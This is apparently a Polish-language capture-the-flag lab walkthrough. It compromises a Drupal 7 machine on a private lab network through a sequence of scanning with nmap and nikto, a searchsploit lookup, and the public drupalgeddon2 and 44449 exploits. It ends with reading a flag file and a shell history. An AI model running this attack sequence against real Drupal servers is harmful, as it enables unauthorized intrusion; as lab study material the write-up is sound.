1. Rozpoznanie (Reconnaissance)
Skanowanie sieci i szukanie usług na maszynie ofiary.

nmap -sV [IP_OFIARY] – Skanowanie portów i wersji usług.

nikto -h [IP_OFIARY] – Skanowanie serwera WWW pod kątem błędów konfiguracji.

2. Szukanie exploitów
Przeszukiwanie bazy pod kątem Drupala.

searchsploit drupal 7 (lub podobne wyszukiwanie w bazie) – Znalezienie dostępnych exploitów.

3. Atak 1: SQL Injection (Zdobycie dostępu do panelu WWW)
Użycie skryptu Python do zresetowania hasła administratora lub dodania nowego użytkownika.

python drupalgeddon2.py [IP_OFIARY] (lub inny skrypt SQLi z searchsploita, którego użyłeś).

4. Atak 2: RCE (Zdobycie powłoki systemowej)
Próba użycia exploita 44449 (Ruby), naprawa błędów i skuteczne włamanie.

ruby 44449.rb [IP_OFIARY] – Pierwsza próba (nieudana przez błąd biblioteki).

sudo gem install highline -v 2.1.0 – Instalacja brakującej, starszej wersji biblioteki.

ruby 44449.rb [IP_OFIARY] – Ponowne, udane uruchomienie exploita.

5. Post-eksploitacja (Szukanie flagi)
Komendy wpisane już wewnątrz przejętego systemu.

ls – Wylistowanie plików w katalogu.

cat flag1.txt – Odczytanie zawartości pierwszej flagi.

## Wynik komendy history:

  501  sudo netdiscover -r 192.168.64.0/24
  502  nmap -sV 192.168.64.10
  503  nikto -h 192.168.64.10
  504  searchsploit drupal 7
  505  searchsploit -m 44449
  506  python3 drupalgeddon2.py 192.168.64.10
  507  ruby 44449.rb 192.168.64.10
  508  sudo gem install highline -v 2.1.0
  509  ruby 44449.rb 192.168.64.10